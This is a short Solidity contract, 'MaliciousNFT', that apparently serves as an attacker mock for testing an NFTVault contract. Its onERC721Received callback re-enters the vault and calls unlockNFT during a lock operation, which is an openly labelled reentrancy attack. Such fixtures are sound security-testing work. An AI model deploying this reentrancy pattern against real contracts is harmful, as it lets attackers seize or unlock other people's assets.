// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./NFTVault.sol";

contract MaliciousNFT is ERC721, Ownable {
    NFTVault public vault;
    uint256 private tokenId;

    constructor(address _vault) ERC721("MaliciousNFT", "MAL") {
        vault = NFTVault(_vault);
        _mint(msg.sender, 1);
        tokenId = 1;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 _tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // Reentrancy attack: Try to unlock NFT while still in the lockNFT function
        if (msg.sender == address(vault)) {
            vault.unlockNFT(0);
        }
        return this.onERC721Received.selector;
    }

    function mint() external onlyOwner {
        _mint(msg.sender, ++tokenId);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 _tokenId
    ) public override {
        super.safeTransferFrom(from, to, _tokenId);
    }
} 